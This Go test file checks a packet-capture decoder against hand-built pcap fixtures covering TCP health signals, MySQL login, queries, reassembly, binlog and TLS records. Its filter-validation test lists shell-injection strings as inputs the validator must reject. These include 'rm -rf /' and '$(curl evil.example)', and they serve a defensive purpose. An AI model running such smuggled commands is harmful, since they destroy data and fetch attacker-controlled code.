package main

// pktinspect_test.go — the Packet Inspector's decoder, driven by hand-built captures.
//
// Every case here is a byte-level fixture rather than a mock, because that is what
// the feature actually consumes: a pcap file. The builder below writes real classic
// pcap records with real Ethernet/IPv4/TCP headers, so a test failing means the
// decoder would fail on the wire too.
//
// Several of these exist because the first live capture broke them: a busy server's
// connections predate the capture (TestPktMidStreamIsConservative), a prepared
// statement's OK packet is not a plain OK (TestPktPreparedStatementResponse), and a
// replica's binlog stream is not a result set (TestPktBinlogStreamMidCapture).

import (
	"encoding/binary"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------- pcap builder

type pcapBuilder struct {
	buf      []byte
	linkType int
	t0       time.Time
}

func newPcap(linkType int) *pcapBuilder {
	b := &pcapBuilder{linkType: linkType, t0: time.Unix(1785775360, 0)}
	h := make([]byte, 24)
	binary.LittleEndian.PutUint32(h, 0xa1b2c3d4)
	binary.LittleEndian.PutUint16(h[4:], 2)
	binary.LittleEndian.PutUint16(h[6:], 4)
	binary.LittleEndian.PutUint32(h[16:], 65535)
	binary.LittleEndian.PutUint32(h[20:], uint32(linkType))
	b.buf = h
	return b
}

// frame appends one record at t0+offset.
func (b *pcapBuilder) frame(offset time.Duration, payload []byte) {
	ts := b.t0.Add(offset)
	rec := make([]byte, 16)
	binary.LittleEndian.PutUint32(rec, uint32(ts.Unix()))
	binary.LittleEndian.PutUint32(rec[4:], uint32(ts.Nanosecond()/1000))
	binary.LittleEndian.PutUint32(rec[8:], uint32(len(payload)))
	binary.LittleEndian.PutUint32(rec[12:], uint32(len(payload)))
	b.buf = append(b.buf, rec...)
	b.buf = append(b.buf, payload...)
}

// ethIPv4TCP builds a complete Ethernet+IPv4+TCP frame.
func ethIPv4TCP(srcIP, dstIP string, srcPort, dstPort int, seq, ack uint32, flags uint8, window int, payload []byte) []byte {
	eth := make([]byte, 14)
	copy(eth, []byte{0x02, 0, 0, 0, 0, 1, 0x02, 0, 0, 0, 0, 2})
	binary.BigEndian.PutUint16(eth[12:], 0x0800)

	tcp := make([]byte, 20)
	binary.BigEndian.PutUint16(tcp, uint16(srcPort))
	binary.BigEndian.PutUint16(tcp[2:], uint16(dstPort))
	binary.BigEndian.PutUint32(tcp[4:], seq)
	binary.BigEndian.PutUint32(tcp[8:], ack)
	tcp[12] = 5 << 4 // data offset, no options
	tcp[13] = flags
	binary.BigEndian.PutUint16(tcp[14:], uint16(window))
	tcp = append(tcp, payload...)

	ip := make([]byte, 20)
	ip[0] = 0x45
	binary.BigEndian.PutUint16(ip[2:], uint16(20+len(tcp)))
	ip[8] = 64
	ip[9] = 6 // TCP
	copy(ip[12:], parseIP4(srcIP))
	copy(ip[16:], parseIP4(dstIP))

	out := append([]byte{}, eth...)
	out = append(out, ip...)
	return append(out, tcp...)
}

func parseIP4(s string) []byte {
	out := make([]byte, 4)
	for i, part := range strings.Split(s, ".") {
		n := 0
		for _, c := range part {
			n = n*10 + int(c-'0')
		}
		out[i] = byte(n)
	}
	return out
}

// mysqlPkt wraps a payload in MySQL's 4-byte packet header.
func mysqlPkt(seq byte, payload []byte) []byte {
	h := []byte{byte(len(payload)), byte(len(payload) >> 8), byte(len(payload) >> 16), seq}
	return append(h, payload...)
}

// Shorthands for the two peers used throughout.
const (
	cliIP, srvIP     = "10.0.0.9", "10.0.0.5"
	cliPort, srvPort = 44444, 3306
)

func c2s(seq, ack uint32, flags uint8, payload []byte) []byte {
	return ethIPv4TCP(cliIP, srvIP, cliPort, srvPort, seq, ack, flags, 64240, payload)
}
func s2c(seq, ack uint32, flags uint8, payload []byte) []byte {
	return ethIPv4TCP(srvIP, cliIP, srvPort, cliPort, seq, ack, flags, 64240, payload)
}

// greeting is a minimal but valid protocol-10 handshake packet.
func greeting(version string) []byte {
	p := []byte{10}
	p = append(p, []byte(version)...)
	p = append(p, 0)
	p = append(p, 1, 0, 0, 0)                             // connection id
	p = append(p, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h') // auth-plugin-data-1
	p = append(p, 0)
	p = append(p, 0xff, 0xf7) // capability flags (lower)
	return mysqlPkt(0, p)
}

func okPacket(seq byte, rows, insertID byte) []byte {
	return mysqlPkt(seq, []byte{0x00, rows, insertID, 0x02, 0x00, 0x00, 0x00})
}

func errPacket(seq byte, code uint16, state, msg string) []byte {
	p := []byte{0xff, byte(code), byte(code >> 8), '#'}
	p = append(p, []byte(state)...)
	p = append(p, []byte(msg)...)
	return mysqlPkt(seq, p)
}

func decodeCap(t *testing.T, b *pcapBuilder) *pktDecoded {
	t.Helper()
	d, err := pktDecode(b.buf, pktDecodeOpts{ServerPort: srvPort})
	if err != nil {
		t.Fatalf("decode: %v", err)
	}
	return d
}

// infoOf returns the Info line of the packet with the given number.
func infoOf(d *pktDecoded, no int) string {
	for _, p := range d.Packets {
		if p.No == no {
			return p.Info
		}
	}
	return ""
}

func packetNo(d *pktDecoded, no int) *pktPacket {
	for i := range d.Packets {
		if d.Packets[i].No == no {
			return &d.Packets[i]
		}
	}
	return nil
}

// ---------------------------------------------------------------- capture files

func TestPktOpenFormats(t *testing.T) {
	// Classic little-endian, built by the helper.
	if r, err := pktOpen(newPcap(pktLinkEther).buf); err != nil || r.format != "pcap" || r.linkType != 1 {
		t.Errorf("classic pcap: %+v %v", r, err)
	}
	// Nanosecond magic.
	ns := newPcap(pktLinkEther).buf
	binary.LittleEndian.PutUint32(ns, 0xa1b23c4d)
	if r, err := pktOpen(ns); err != nil || !r.nano || r.format != "pcap-ns" {
		t.Errorf("ns pcap: %+v %v", r, err)
	}
	// Big-endian magic swaps the reader's byte order.
	be := make([]byte, 24)
	binary.BigEndian.PutUint32(be, 0xa1b2c3d4)
	binary.BigEndian.PutUint32(be[20:], 113)
	if r, err := pktOpen(be); err != nil || r.linkType != pktLinkSLL {
		t.Errorf("be pcap: %+v %v", r, err)
	}
	// Garbage and truncation are refused with a message, not a panic.
	if _, err := pktOpen([]byte("not a pcap at all, but long enough to pass")); err == nil {
		t.Error("garbage accepted as a capture")
	}
	if _, err := pktOpen([]byte{1, 2, 3}); err == nil {
		t.Error("a 3-byte file accepted as a capture")
	}
}

// pcapng is what Wireshark saves, so an upload can arrive in it.
func TestPktOpenPcapng(t *testing.T) {
	le := binary.LittleEndian
	var buf []byte
	// Section Header Block.
	shb := make([]byte, 28)
	le.PutUint32(shb, 0x0a0d0d0a)
	le.PutUint32(shb[4:], 28)
	le.PutUint32(shb[8:], 0x1a2b3c4d)
	le.PutUint16(shb[12:], 1)
	le.PutUint64(shb[16:], 0xffffffffffffffff)
	le.PutUint32(shb[24:], 28)
	buf = append(buf, shb...)
	// Interface Description Block: link type Ethernet.
	idb := make([]byte, 20)
	le.PutUint32(idb, 1)
	le.PutUint32(idb[4:], 20)
	le.PutUint16(idb[8:], 1)
	le.PutUint32(idb[12:], 65535)
	le.PutUint32(idb[16:], 20)
	buf = append(buf, idb...)
	// Enhanced Packet Block carrying one frame.
	frame := c2s(1, 1, tcpSYN, nil)
	pad := (4 - len(frame)%4) % 4
	body := make([]byte, 20+len(frame)+pad)
	le.PutUint32(body[12:], uint32(len(frame)))
	le.PutUint32(body[16:], uint32(len(frame)))
	copy(body[20:], frame)
	epb := make([]byte, 8+len(body)+4)
	le.PutUint32(epb, 6)
	le.PutUint32(epb[4:], uint32(len(epb)))
	copy(epb[8:], body)
	le.PutUint32(epb[len(epb)-4:], uint32(len(epb)))
	buf = append(buf, epb...)

	d, err := pktDecode(buf, pktDecodeOpts{ServerPort: srvPort})
	if err != nil {
		t.Fatalf("pcapng: %v", err)
	}
	if d.Format != "pcapng" || len(d.Packets) != 1 {
		t.Fatalf("pcapng decode: format=%s packets=%d", d.Format, len(d.Packets))
	}
	if !strings.Contains(d.Packets[0].Flags, "SYN") {
		t.Errorf("pcapng frame not parsed: %+v", d.Packets[0])
	}
}

// `tcpdump -i any` writes Linux cooked frames, and a VLAN trunk adds tags. Both
// have to reach the IP layer or an entire capture decodes as "unparsable".
func TestPktLinkLayers(t *testing.T) {
	ip := func() []byte {
		full := c2s(1, 0, tcpSYN, nil)
		return full[14:] // strip the Ethernet header
	}
	// SLL v1: 16-byte header, protocol at +14.
	sll := make([]byte, 16)
	binary.BigEndian.PutUint16(sll[14:], 0x0800)
	// SLL v2: 20-byte header, protocol first.
	sll2 := make([]byte, 20)
	binary.BigEndian.PutUint16(sll2[0:], 0x0800)
	// VLAN-tagged Ethernet.
	vlan := append([]byte{}, c2s(1, 0, tcpSYN, nil)[:12]...)
	vlan = append(vlan, 0x81, 0x00, 0x00, 0x64, 0x08, 0x00)

	for _, tc := range []struct {
		name  string
		link  int
		frame []byte
	}{
		{"sll", pktLinkSLL, append(sll, ip()...)},
		{"sll2", pktLinkSLL2, append(sll2, ip()...)},
		{"raw", pktLinkRaw, ip()},
		{"null", pktLinkNull, append([]byte{2, 0, 0, 0}, ip()...)},
		{"vlan", pktLinkEther, append(vlan, ip()...)},
	} {
		b := newPcap(tc.link)
		b.frame(0, tc.frame)
		d := decodeCap(t, b)
		if len(d.Packets) != 1 {
			t.Fatalf("%s: %d packets", tc.name, len(d.Packets))
		}
		if got := d.Packets[0]; got.Proto != "TCP" || got.Src != "10.0.0.9:44444" {
			t.Errorf("%s: proto=%s src=%s info=%q", tc.name, got.Proto, got.Src, got.Info)
		}
	}
}

// ---------------------------------------------------------------- TCP health

func TestPktTCPHealthSignals(t *testing.T) {
	b := newPcap(pktLinkEther)
	// Handshake, with a 20 ms round trip.
	b.frame(0, c2s(1000, 0, tcpSYN, nil))
	b.frame(20*time.Millisecond, s2c(5000, 1001, tcpSYN|tcpACK, nil))
	b.frame(21*time.Millisecond, c2s(1001, 5001, tcpACK, nil))
	// Data, then the same bytes again: a retransmission.
	b.frame(30*time.Millisecond, c2s(1001, 5001, tcpACK|tcpPSH, []byte("hello")))
	b.frame(40*time.Millisecond, c2s(1001, 5001, tcpACK|tcpPSH, []byte("hello")))
	// A jump forward in sequence space: bytes the capture never saw.
	b.frame(50*time.Millisecond, c2s(1500, 5001, tcpACK|tcpPSH, []byte("later")))
	// Three identical pure ACKs: duplicate ACKs.
	b.frame(60*time.Millisecond, s2c(5001, 1006, tcpACK, nil))
	b.frame(61*time.Millisecond, s2c(5001, 1006, tcpACK, nil))
	b.frame(62*time.Millisecond, s2c(5001, 1006, tcpACK, nil))
	// A zero window, then a reset.
	b.frame(70*time.Millisecond, ethIPv4TCP(srvIP, cliIP, srvPort, cliPort, 5001, 1600, tcpACK, 0, nil))
	b.frame(80*time.Millisecond, c2s(1600, 5001, tcpRST, nil))

	d := decodeCap(t, b)
	want := map[int]string{
		5:  "TCP retransmission",
		6:  "TCP gap",
		9:  "TCP duplicate ACK",
		10: "TCP zero window",
		11: "TCP reset",
	}
	for no, kind := range want {
		p := packetNo(d, no)
		if p == nil {
			t.Fatalf("no packet %d", no)
		}
		found := false
		for _, is := range p.Issues {
			if strings.HasPrefix(is, kind) {
				found = true
			}
		}
		if !found {
			t.Errorf("packet %d: issues %v, want %s (info %q)", no, p.Issues, kind, p.Info)
		}
	}
	// The SYN/ACK carries the handshake round trip.
	if p := packetNo(d, 2); p == nil || p.LagMS < 19 || p.LagMS > 21 {
		t.Errorf("SYN→SYN,ACK latency = %v, want ~20ms", p.LagMS)
	}
	// A clean frame must not be decorated with issues.
	if p := packetNo(d, 3); len(p.Issues) != 0 {
		t.Errorf("clean ACK got issues %v", p.Issues)
	}
	if d.Streams[0].Reset != true {
		t.Error("the stream should be marked reset")
	}
}

// ---------------------------------------------------------------- MySQL

// The full happy path: greeting, login, query, result set — with the connection's
// SYN captured, so the decoder is synchronised and every field is trustworthy.
func TestPktMySQLConversation(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, c2s(1, 0, tcpSYN, nil))
	b.frame(time.Millisecond, s2c(1, 2, tcpSYN|tcpACK, nil))
	b.frame(2*time.Millisecond, s2c(2, 2, tcpACK|tcpPSH, greeting("8.0.46-37")))
	// Handshake response naming the user.
	resp := make([]byte, 32)
	binary.LittleEndian.PutUint32(resp, 0x000a8285) // no CLIENT_SSL
	resp = append(resp, []byte("alice")...)
	resp = append(resp, 0)
	b.frame(3*time.Millisecond, c2s(2, 100, tcpACK|tcpPSH, mysqlPkt(1, resp)))
	b.frame(4*time.Millisecond, s2c(100, 40, tcpACK|tcpPSH, okPacket(2, 0, 0)))
	// A query and a two-row, one-column result set.
	q := append([]byte{comQuery}, []byte("SELECT id FROM orders WHERE id > 10")...)
	b.frame(10*time.Millisecond, c2s(40, 110, tcpACK|tcpPSH, mysqlPkt(0, q)))
	rs := mysqlPkt(1, []byte{0x01})                         // one column
	rs = append(rs, mysqlPkt(2, []byte{3, 'i', 'd', 0})...) // column definition
	rs = append(rs, mysqlPkt(3, []byte{2, '1', '1'})...)    // row
	rs = append(rs, mysqlPkt(4, []byte{2, '1', '2'})...)    // row
	rs = append(rs, mysqlPkt(5, []byte{0xfe, 0, 0, 2, 0})...)
	b.frame(150*time.Millisecond, s2c(110, 90, tcpACK|tcpPSH, rs))
	// An error response to the next statement.
	q2 := append([]byte{comQuery}, []byte("SELECT nope FROM orders")...)
	b.frame(160*time.Millisecond, c2s(90, 400, tcpACK|tcpPSH, mysqlPkt(0, q2)))
	b.frame(170*time.Millisecond, s2c(400, 130, tcpACK|tcpPSH,
		errPacket(1, 1054, "42S22", "Unknown column 'nope' in 'field list'")))

	d := decodeCap(t, b)

	if got := infoOf(d, 3); !strings.Contains(got, "8.0.46-37") || !strings.Contains(got, "connection id 1") {
		t.Errorf("greeting: %q", got)
	}
	if got := infoOf(d, 4); !strings.Contains(got, "alice") {
		t.Errorf("login: %q", got)
	}
	if got := infoOf(d, 6); !strings.Contains(got, "SELECT id FROM orders") {
		t.Errorf("query: %q", got)
	}
	// The result set reports its shape, and the response carries the latency.
	p := packetNo(d, 7)
	if !strings.Contains(p.Info, "2 row(s)") || !strings.Contains(p.Info, "1 column(s)") {
		t.Errorf("result set: %q", p.Info)
	}
	if p.LagMS < 139 || p.LagMS > 141 {
		t.Errorf("response latency = %v, want ~140ms", p.LagMS)
	}
	if !p.hasIssue("High latency") {
		t.Errorf("a 140 ms response should be flagged: %v", p.Issues)
	}
	// The error is decoded with its code, and the request's SQL is attached.
	e := packetNo(d, 9)
	if e.ErrCode != 1054 || !strings.Contains(e.Status, "42S22") {
		t.Errorf("error packet: code=%d status=%q", e.ErrCode, e.Status)
	}
	if !strings.Contains(e.Query, "SELECT nope") {
		t.Errorf("error response should carry the statement that caused it: %q", e.Query)
	}
	st := d.Streams[0]
	if st.User != "alice" || st.Version != "8.0.46-37" || st.Queries != 2 || st.Errors != 1 {
		t.Errorf("stream summary: %+v", st)
	}
}

// A MySQL packet may be split across TCP segments, and a 16 MB one arrives as
// several 0xffffff-length packets. Both are reassembly, and getting either wrong
// turns a capture into noise.
func TestPktMySQLReassembly(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, c2s(1, 0, tcpSYN, nil))
	b.frame(time.Millisecond, s2c(1, 2, tcpSYN|tcpACK, nil))
	b.frame(2*time.Millisecond, s2c(2, 2, tcpACK|tcpPSH, greeting("8.0.46")))
	resp := append(make([]byte, 32), []byte("bob\x00")...)
	binary.LittleEndian.PutUint32(resp, 0x000a8285)
	b.frame(3*time.Millisecond, c2s(2, 100, tcpACK|tcpPSH, mysqlPkt(1, resp)))
	b.frame(4*time.Millisecond, s2c(100, 40, tcpACK|tcpPSH, okPacket(2, 0, 0)))

	// One COM_QUERY split over three segments.
	sql := "SELECT " + strings.Repeat("x", 60) + " FROM t"
	full := mysqlPkt(0, append([]byte{comQuery}, []byte(sql)...))
	seq := uint32(40)
	for _, chunk := range [][]byte{full[:6], full[6:20], full[20:]} {
		b.frame(10*time.Millisecond, c2s(seq, 110, tcpACK|tcpPSH, chunk))
		seq += uint32(len(chunk))
	}
	d := decodeCap(t, b)
	// The statement is reported on the frame that COMPLETED it, not before.
	if got := infoOf(d, 6); !strings.Contains(got, "continuation") {
		t.Errorf("first fragment should be a continuation, got %q", got)
	}
	if got := infoOf(d, 8); !strings.Contains(got, "SELECT xxx") {
		t.Errorf("completing fragment should carry the query, got %q", got)
	}
}

// A prepared statement's response is not an OK packet, and reading it as one
// reported "OK: 6975681 rows affected" on the very first live capture.
func TestPktPreparedStatementResponse(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, c2s(1, 0, tcpSYN, nil))
	b.frame(time.Millisecond, s2c(1, 2, tcpSYN|tcpACK, nil))
	b.frame(2*time.Millisecond, s2c(2, 2, tcpACK|tcpPSH, greeting("8.0.46")))
	resp := append(make([]byte, 32), []byte("app\x00")...)
	binary.LittleEndian.PutUint32(resp, 0x000a8285)
	b.frame(3*time.Millisecond, c2s(2, 100, tcpACK|tcpPSH, mysqlPkt(1, resp)))
	b.frame(4*time.Millisecond, s2c(100, 40, tcpACK|tcpPSH, okPacket(2, 0, 0)))

	prep := append([]byte{comStmtPrepare}, []byte("INSERT INTO t (a,b) VALUES (?,?)")...)
	b.frame(10*time.Millisecond, c2s(40, 110, tcpACK|tcpPSH, mysqlPkt(0, prep)))
	// COM_STMT_PREPARE_OK: status, stmt id 97, 0 columns, 2 params, filler, warnings
	// … followed by the two parameter definitions, which must not count as rows.
	ok := mysqlPkt(1, []byte{0x00, 97, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0})
	ok = append(ok, mysqlPkt(2, []byte{3, 'd', 'e', 'f'})...)
	ok = append(ok, mysqlPkt(3, []byte{3, 'd', 'e', 'f'})...)
	b.frame(11*time.Millisecond, s2c(110, 90, tcpACK|tcpPSH, ok))

	d := decodeCap(t, b)
	got := infoOf(d, 7)
	if !strings.Contains(got, "Prepared OK: stmt 97") || !strings.Contains(got, "2 parameter(s)") {
		t.Errorf("prepare response: %q", got)
	}
	if strings.Contains(got, "row(s) affected") {
		t.Errorf("prepare response must not read as an OK packet: %q", got)
	}
}

// Most connections on a busy server are older than the capture. Without the SYN
// there is no way to know whether a server packet is an OK or the middle of a
// result set, so the decoder must not guess — but one complete command re-anchors
// it, and from there the conversation is readable again.
func TestPktMidStreamIsConservative(t *testing.T) {
	b := newPcap(pktLinkEther)
	// No SYN: the capture joins an established connection mid-flight. This server
	// payload happens to start with 0x00, which a naive decoder reads as an OK.
	b.frame(0, s2c(9000, 500, tcpACK|tcpPSH, mysqlPkt(7, []byte{0x00, 0xfb, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88})))
	// Then a real client command, which anchors the server direction.
	q := append([]byte{comQuery}, []byte("SELECT 1")...)
	b.frame(10*time.Millisecond, c2s(500, 9100, tcpACK|tcpPSH, mysqlPkt(0, q)))
	b.frame(12*time.Millisecond, s2c(9100, 513, tcpACK|tcpPSH, okPacket(1, 3, 7)))

	d := decodeCap(t, b)
	if got := infoOf(d, 1); !strings.Contains(got, "mid-connection") {
		t.Errorf("unsynchronised server payload should say so, got %q", got)
	}
	if p := packetNo(d, 1); strings.Contains(p.Info, "row(s) affected") {
		t.Errorf("mid-stream bytes must not be reported as an OK packet: %q", p.Info)
	}
	if got := infoOf(d, 2); !strings.Contains(got, "SELECT 1") {
		t.Errorf("a plausible command is still decoded mid-stream, got %q", got)
	}
	// Re-anchored: the response to that command IS trustworthy.
	if got := infoOf(d, 3); !strings.Contains(got, "3 row(s) affected") {
		t.Errorf("response after re-anchoring should decode, got %q", got)
	}
}

// An ERR packet is the one server packet whose meaning is unambiguous mid-stream,
// and it is the one worth reporting: this is how a lock wait timeout on a
// long-running connection shows up.
func TestPktMidStreamStillReportsErrors(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, s2c(9000, 500, tcpACK|tcpPSH,
		errPacket(1, 1205, "HY000", "Lock wait timeout exceeded; try restarting transaction")))
	d := decodeCap(t, b)
	p := packetNo(d, 1)
	if p.ErrCode != 1205 {
		t.Fatalf("mid-stream ERR not decoded: %+v", p)
	}
	if len(p.Issues) == 0 || !strings.Contains(p.Issues[0], "Lock wait timeout") {
		t.Errorf("issues = %v", p.Issues)
	}
}

// A replica's binlog stream outlives any capture, so it is always seen mid-stream.
// Its event packets start with 0x00 like an OK, and reading them as OKs is what
// produced "OK: 87024254250021057 row(s) affected" live.
func TestPktBinlogStreamMidCapture(t *testing.T) {
	// A GTID_LOG_EVENT: OK byte, then a 19-byte header whose size field matches.
	ev := make([]byte, 20)
	ev[0] = 0x00
	binary.LittleEndian.PutUint32(ev[1:], 1785775360) // timestamp
	ev[5] = 0x21                                      // GTID_LOG_EVENT
	binary.LittleEndian.PutUint32(ev[6:], 100)        // server id
	binary.LittleEndian.PutUint32(ev[10:], 19)        // event size == payload after the OK byte
	binary.LittleEndian.PutUint32(ev[14:], 47872474)  // next position

	b := newPcap(pktLinkEther)
	b.frame(0, s2c(9000, 500, tcpACK|tcpPSH, mysqlPkt(3, ev)))
	d := decodeCap(t, b)
	got := infoOf(d, 1)
	if !strings.Contains(got, "GTID_LOG_EVENT") || !strings.Contains(got, "next pos 47872474") {
		t.Errorf("binlog event: %q", got)
	}
	if strings.Contains(got, "row(s) affected") {
		t.Errorf("a binlog event must not read as an OK packet: %q", got)
	}
}

// ---------------------------------------------------------------- TLS

// The client's SSLRequest is where a plaintext capture goes blind. It must say so,
// mark the stream, and then describe the TLS records instead of inventing MySQL.
func TestPktTLSUpgradeIsRecognised(t *testing.T) {
	b := newPcap(pktLinkEther)
	b.frame(0, c2s(1, 0, tcpSYN, nil))
	b.frame(time.Millisecond, s2c(1, 2, tcpSYN|tcpACK, nil))
	b.frame(2*time.Millisecond, s2c(2, 2, tcpACK|tcpPSH, greeting("8.0.46")))
	// SSLRequest: 32-byte body with CLIENT_SSL set and no username.
	ssl := make([]byte, 32)
	binary.LittleEndian.PutUint32(ssl, 0x000a8285|capSSL)
	b.frame(3*time.Millisecond, c2s(2, 100, tcpACK|tcpPSH, mysqlPkt(1, ssl)))
	// A ClientHello, then application data.
	hello := []byte{0x16, 0x03, 0x01, 0x00, 0x05, 0x01, 0, 0, 0, 0}
	b.frame(4*time.Millisecond, c2s(38, 100, tcpACK|tcpPSH, hello))
	appdata := append([]byte{0x17, 0x03, 0x03, 0x00, 0x04}, []byte{1, 2, 3, 4}...)
	b.frame(5*time.Millisecond, s2c(100, 48, tcpACK|tcpPSH, appdata))

	d := decodeCap(t, b)
	if got := infoOf(d, 4); !strings.Contains(got, "SSLRequest") {
		t.Errorf("SSLRequest: %q", got)
	}
	if p := packetNo(d, 5); p.Proto != "TLS" || !strings.Contains(p.Info, "ClientHello") {
		t.Errorf("ClientHello: proto=%s info=%q", p.Proto, p.Info)
	}
	p := packetNo(d, 6)
	if p.Proto != "TLS" || !strings.Contains(p.Info, "Application Data") || p.Status != "Encrypted" {
		t.Errorf("application data: proto=%s status=%q info=%q", p.Proto, p.Status, p.Info)
	}
	if !d.Streams[0].TLS {
		t.Error("the stream should be marked TLS")
	}
	// And no invented SQL anywhere after the upgrade.
	for _, x := range d.Packets[4:] {
		if x.Query != "" && !strings.HasPrefix(x.Query, "--") {
			t.Errorf("packet %d invented a query from ciphertext: %q", x.No, x.Query)
		}
	}
}

// After a ChangeCipherSpec (or a TLS 1.3 ServerHello) the handshake is encrypted, and a
// record's message-type byte is ciphertext. A live capture had a post-ServerHello record
// labelled "Handshake: ClientHello" because that byte happened to be 0x01.
func TestPktTLSSealedHandshakeIsNotNamed(t *testing.T) {
	rec := []byte{0x16, 0x03, 0x03, 0x00, 0x05, 0x01, 0, 0, 0, 0} // type byte reads as ClientHello
	if got := pktTLSInfo(rec, false); !strings.Contains(got, "ClientHello") {
		t.Errorf("in the clear it should be named: %q", got)
	}
	if got := pktTLSInfo(rec, true); strings.Contains(got, "ClientHello") {
		t.Errorf("sealed, it must not be named: %q", got)
	} else if !strings.Contains(got, "Handshake (encrypted)") {
		t.Errorf("sealed handshake record: %q", got)
	}
	// What seals it.
	for _, tc := range []struct {
		name string
		rec  []byte
		want bool
	}{
		{"ChangeCipherSpec", []byte{0x14, 0x03, 0x03, 0x00, 0x01, 0x01}, true},
		{"ServerHello", []byte{0x16, 0x03, 0x03, 0x00, 0x05, 0x02, 0, 0, 0, 0}, true},
		{"ClientHello", []byte{0x16, 0x03, 0x01, 0x00, 0x05, 0x01, 0, 0, 0, 0}, false},
		{"ApplicationData", []byte{0x17, 0x03, 0x03, 0x00, 0x02, 0x01, 0x02}, false},
	} {
		if got := pktTLSSeals(tc.rec); got != tc.want {
			t.Errorf("pktTLSSeals(%s) = %v, want %v", tc.name, got, tc.want)
		}
	}
}

func TestPktTLSVersionAndRecordNames(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"\x16\x03\x03\x00\x01\x02", "TLS 1.2 Handshake: ServerHello"},
		{"\x15\x03\x03\x00\x02\x01\x50", "TLS 1.2 Alert"},
		{"\x14\x03\x03\x00\x01\x01", "TLS 1.2 ChangeCipherSpec"},
		{"\x17\x03\x04\x00\x03\x01\x02\x03", "TLS 1.3 Application Data"},
	} {
		if got := pktTLSInfo([]byte(tc.in), false); !strings.Contains(got, tc.want) {
			t.Errorf("pktTLSInfo(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// ---------------------------------------------------------------- capture command

// The BPF filter is user input that lands in a shell command line on a database
// node. Only what BPF actually needs is allowed through.
func TestPktFilterValidation(t *testing.T) {
	for _, ok := range []string{
		"", "host 10.0.0.5", "tcp port 3306 and not src 1.2.3.4", "len > 100",
		"tcp[tcpflags] & tcp-syn != 0", "ip[2:2] > 576", "(port 3306) and (host 10.0.0.5)",
	} {
		if err := pktValidateFilter(ok); err != nil {
			t.Errorf("valid filter %q rejected: %v", ok, err)
		}
	}
	for _, bad := range []string{
		"host 1.2.3.4; rm -rf /",
		"$(curl evil.example)",
		"`id`",
		"host $(hostname)",
		"host 1.2.3.4\nrm -rf /",
		"host 'quoted'",
		strings.Repeat("a", 201),
	} {
		if err := pktValidateFilter(bad); err == nil {
			t.Errorf("dangerous filter accepted: %q", bad)
		}
	}
}

func TestPktBPFComposition(t *testing.T) {
	if got := pktBPF(pktCapRequest{Port: 3306}); got != "port 3306" {
		t.Errorf("port only: %q", got)
	}
	if got := pktBPF(pktCapRequest{Port: 13000, Filter: "host 10.0.0.5"}); got != "port 13000 and (host 10.0.0.5)" {
		t.Errorf("port + filter: %q", got)
	}
	// "All ports" drops the port term but keeps the user's expression.
	if got := pktBPF(pktCapRequest{Port: 3306, Filter: "icmp", NoFilter: true}); got != "(icmp)" {
		t.Errorf("all ports: %q", got)
	}
}

// ---------------------------------------------------------------- ranges

func testDecodedForRanges() *pktDecoded {
	return &pktDecoded{
		Packets: []pktPacket{
			{No: 1, TSUnix: 100.0, Stream: 0, Dir: "c2s", Proto: "MySQL", Info: "Query: SELECT a", Query: "SELECT a", Command: "COM_QUERY", FrameLen: 100, Src: "10.0.0.9:44444", Dst: "10.0.0.5:3306"},
			{No: 2, TSUnix: 100.5, Stream: 0, Dir: "s2c", Proto: "MySQL", Info: "OK", FrameLen: 80, Src: "10.0.0.5:3306", Dst: "10.0.0.9:44444"},
			{No: 3, TSUnix: 101.0, Stream: 1, Dir: "c2s", Proto: "TCP", Info: "[RST]", FrameLen: 60, Issues: []string{"TCP reset"}},
			{No: 4, TSUnix: 101.5, Stream: 1, Dir: "s2c", Proto: "MySQL", Info: "Error 1205", ErrCode: 1205, FrameLen: 120, Issues: []string{"Lock wait timeout (1205)"}},
			{No: 5, TSUnix: 102.0, Stream: 0, Dir: "s2c", Proto: "TLS", Info: "Application Data", FrameLen: 300},
		},
		Streams: []pktStream{{Index: 0}, {Index: 1}},
	}
}

func TestPktQueryRanges(t *testing.T) {
	d := testDecodedForRanges()
	count := func(q pktQuery) int {
		n := 0
		for i := range d.Packets {
			if q.match(&d.Packets[i]) {
				n++
			}
		}
		return n
	}
	for _, tc := range []struct {
		name string
		q    pktQuery
		want int
	}{
		{"all", pktQuery{Stream: -1}, 5},
		{"packet range", pktQuery{Stream: -1, FromNo: 2, ToNo: 4}, 3},
		{"time range", pktQuery{Stream: -1, FromTS: 100.4, ToTS: 101.1}, 2},
		{"one stream", pktQuery{Stream: 1}, 2},
		{"protocol", pktQuery{Stream: -1, Proto: "mysql"}, 3},
		{"direction", pktQuery{Stream: -1, Dir: "c2s"}, 2},
		{"any issue", pktQuery{Stream: -1, Issue: "any"}, 2},
		{"issue kind", pktQuery{Stream: -1, Issue: "TCP reset"}, 1},
		{"search sql", pktQuery{Stream: -1, Search: "select a"}, 1},
		{"search address", pktQuery{Stream: -1, Search: "44444"}, 2},
		{"combined", pktQuery{Stream: 0, Proto: "MySQL", Dir: "s2c"}, 1},
	} {
		if got := count(tc.q); got != tc.want {
			t.Errorf("%s: matched %d, want %d", tc.name, got, tc.want)
		}
	}
}

func TestPktTimelineBuckets(t *testing.T) {
	d := testDecodedForRanges()
	tl := pktBuildTimeline(d, pktQuery{Stream: -1, Buckets: 4})
	if tl.Total != 5 || tl.FromNo != 1 || tl.ToNo != 5 {
		t.Fatalf("window: %+v", tl)
	}
	if len(tl.Buckets) != 4 {
		t.Fatalf("%d buckets, want 4", len(tl.Buckets))
	}
	sum := 0
	for _, b := range tl.Buckets {
		sum += b.Count
	}
	if sum != 5 {
		t.Errorf("buckets hold %d packets, want 5", sum)
	}
	// Severity is what colours the strip: the reset and the lock timeout are errors.
	errs := 0
	for _, b := range tl.Buckets {
		errs += b.Errors
	}
	if errs != 2 {
		t.Errorf("error-bearing buckets counted %d, want 2", errs)
	}
	// A zoomed window reports only what it contains.
	zoom := pktBuildTimeline(d, pktQuery{Stream: -1, Buckets: 2, FromNo: 3, ToNo: 4})
	if zoom.Total != 2 || zoom.FromNo != 3 || zoom.ToNo != 4 {
